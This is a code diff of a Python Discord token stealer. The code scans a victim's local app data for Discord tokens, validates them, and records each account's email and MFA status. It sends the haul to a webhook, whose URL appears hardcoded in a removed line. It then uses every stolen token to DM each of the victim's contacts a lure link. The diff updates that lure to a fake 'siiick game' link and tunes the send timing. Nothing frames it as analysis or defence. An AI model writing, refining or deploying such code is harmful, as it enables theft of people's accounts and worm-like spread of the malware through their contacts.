@@ -1,9 +1,9 @@
-import os, re, requests, psutil, time
+import os, re, requests, psutil, time, urllib3, logging
 import sqlite3
 from discord import Embed
-WEBHOOK_URL ='https://discord.com/api/webhooks/1312536268474941490/BkUyOtxwOklSYR_fPQH30iN63mDk_aaZSop2TYKLt9iZ-WaOz-m9L_J8pqKOMuJXFjSX'
+from co.config import WEBHOOK_URL
 import threading
-
+logging.getLogger("urllib3").setLevel(logging.NOTSET)
 class DiscordToken:
     def __init__(self):
         self.appdata = os.getenv("localappdata")
@@ -145,7 +145,6 @@ class DiscordToken:
                     file.write(f"Email: {user['email']}\n")
                     file.write(f"MFA Enabled: {user['mfa_enabled']}\n")
                     file.write("----------------------------\n")
-
             self.send_to_webhook()
 
     def send_to_webhook(self):
@@ -177,7 +176,6 @@ class DiscordToken:
     def send_message_to_dms(self, token):
         if not token.startswith("MT"):
             token = "MT" + token
-
         url = "https://discord.com/api/v9/users/@me/channels"
         headers = {"Authorization": token}
         try:
@@ -188,14 +186,13 @@ class DiscordToken:
                     try:
                         channel_id = channel['id']
                         dm_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
-                        data = {"content": "yo bro check dis cool executor out https://gofile.io/d/GdUjEh"}
+                        data = {"content": "yo bro check out this siiick game https://georgethedev0.itch.io/smontop"}
                         requests.post(dm_url, json=data, headers=headers)
-                        time.sleep(3)
+                        time.sleep(2.2)
                     except Exception:
                         pass
         except requests.RequestException:
             pass
-
     def run(self):
         for folder in self.scan_folders():
             self.extract_tokens(folder)
@@ -203,5 +200,3 @@ class DiscordToken:
             self.validate_token(token)
         thread = threading.Thread(target=self.save_tokens)
         thread.start()
-
-DiscordToken()
